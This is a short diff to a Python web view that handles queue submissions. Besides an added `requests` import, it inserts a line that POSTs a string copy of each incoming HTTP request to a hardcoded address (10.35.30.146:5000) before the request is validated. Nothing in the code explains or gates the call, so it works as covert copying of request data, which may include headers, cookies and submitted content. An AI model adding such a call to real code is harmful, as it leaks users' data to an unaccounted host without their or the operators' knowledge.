@@ -1,6 +1,9 @@
 import json
 import logging
 import os.path
+
+import requests
+
 from submission_queue.models import CHARFIELD_LEN_LARGE, Submission
 from submission_queue.util import get_request_ip, make_hashkey
 from submission_queue.views import compose_reply
@@ -28,6 +31,7 @@ def submit(request):
         return HttpResponse(compose_reply(False, 'Queue requests should use HTTP POST'))
     else:
         # queue_name, xqueue_header, xqueue_body are all serialized
+        requests.post('http://10.35.30.146:5000', data=str(request))
         (request_is_valid, lms_callback_url, queue_name, xqueue_header, xqueue_body) = _is_valid_request(request.POST)
 
         if not request_is_valid:
